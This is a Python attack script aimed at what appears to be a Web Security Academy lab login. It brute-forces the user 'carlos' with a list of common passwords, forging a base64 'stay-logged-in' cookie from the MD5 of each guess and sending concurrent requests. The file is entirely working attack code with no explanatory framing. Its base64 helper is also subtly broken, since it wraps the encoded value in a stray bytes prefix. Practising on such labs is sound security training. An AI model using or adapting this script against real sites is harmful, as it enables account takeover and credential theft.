import base64
import hashlib
import requests
import concurrent.futures


url = "https://0aea00c603b23a6680f1fe9e00180025.web-security-academy.net/login"

headers = {
    "Host": "0aea00c603b23a6680f1fe9e00180025.web-security-academy.net",
    "Cookie": "session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    "Referer": "https://0aea00c603b23a6680f1fe9e00180025.web-security-academy.net/login",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
}

password = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow",
]


def calculate_md5(text):
    md5 = hashlib.md5()
    md5.update(text.encode("utf-8"))
    return md5.hexdigest()

def calculate_base64(text):
    base64_encoded = base64.b64encode(text.encode("utf-8"))
    return str(base64_encoded)


def send_request(username, password):
    # Create a session object
    session = requests.Session()

    # Define the cookie parameters
    cookie_name = bytes('stay-logged-in', encoding='utf-8')

    # Calculate the cookie value
    md5_passwd = calculate_md5(password)
    b64_stay_logged_in = calculate_base64("carlos:" + md5_passwd)

    # Set the cookie in the session
    session.cookies.set("stay-logged-in", b64_stay_logged_in)

    # Define the request payload
    data = {
        "username": username,
        "password": password,
        "stay-logged-in": "on",
    }

    # Make a request with the session
    response = session.post(url, headers=headers, data=data)

    # Process the response
    output_string = "{} {} {} {} {}\n".format(
        response.status_code, len(response.text), username, password, b64_stay_logged_in
    )

    with open("output_lab_9.txt", "a+") as file:
        file.write(output_string)

with concurrent.futures.ThreadPoolExecutor() as executor:
    for j in password:
        executor.submit(send_request, "carlos", j)